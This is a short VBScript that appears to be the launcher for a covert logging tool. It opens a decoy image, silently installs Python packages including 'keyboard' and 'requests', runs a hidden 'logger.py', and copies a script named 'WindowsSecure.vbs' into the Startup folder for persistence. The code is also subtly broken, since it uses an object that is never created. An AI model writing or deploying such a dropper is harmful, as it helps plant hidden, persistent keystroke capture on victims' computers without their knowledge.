Set objShell = CreateObject("WScript.Shell")

objShell.Run "wukas.png", 1, False

objShell.Run "pythonw getpip.py", 0, True

objShell.Run "pip install keyboard requests shutil pathlib", 0, True

objShell.Run "pythonw logger.py", 0, True

objShell.Run "WindowsSecure.vbs", 0, True

strScriptDir = objShell.CurrentDirectory
strStartupFolder = objShell.SpecialFolders("Startup")

strSourceFile = strScriptDir & "\WindowsSecure.vbs"
strDestFile = strStartupFolder & "\WindowsSecure.vbs"

If objFSO.FileExists(strSourceFile) Then
    objFSO.CopyFile strSourceFile, strDestFile
    Set objFSO = Nothing
End If
